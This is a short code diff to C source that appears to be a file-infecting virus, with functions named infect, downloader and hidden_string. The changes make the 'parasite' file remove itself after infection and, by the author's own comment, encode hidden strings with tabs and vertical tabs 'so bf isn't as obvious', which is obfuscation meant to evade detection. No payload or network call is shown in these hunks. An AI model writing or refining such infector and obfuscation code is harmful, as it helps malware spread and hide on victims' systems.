@@ -74,7 +74,7 @@ void infect(FILE* h, FILE* p){
   // get file name of parasite and delete it
   sprintf(file_link, "/proc/self/fd/%d", fileno(p));
   ssize_t len = readlink(file_link, file_name, sizeof(file_name));
-  file_name[len] = '\0'; 
+  file_name[len] = 0x00; // gcc warns null character in literall if '\0' is used 
   remove(file_name);
 }
 
@@ -171,10 +171,10 @@ void downloader(){
 char* hidden_string(char* c){
   char* head = (char*)calloc(0xFF, sizeof(char)); // calloc'd memory is not freed so this does introduce a memory leak
   char* start = head;
-  for(int i = 0 ; c[i] != '\0' ; ++i){
-    if(c[i] == '>'){
+  for(int i = 0; c[i] != 0x00; ++i){ // gcc warns null character in literall if '\0' is used
+    if(c[i] == '\v'){ // using horizontal/vertical tabs so bf isn't as obvious
       ++head;
-    }else if(c[i] == '+'){
+    }else if(c[i] == '\t'){
       ++*head;
     }// <, -, [ && ] to be implemented when brainfuck code generation uses them
   }
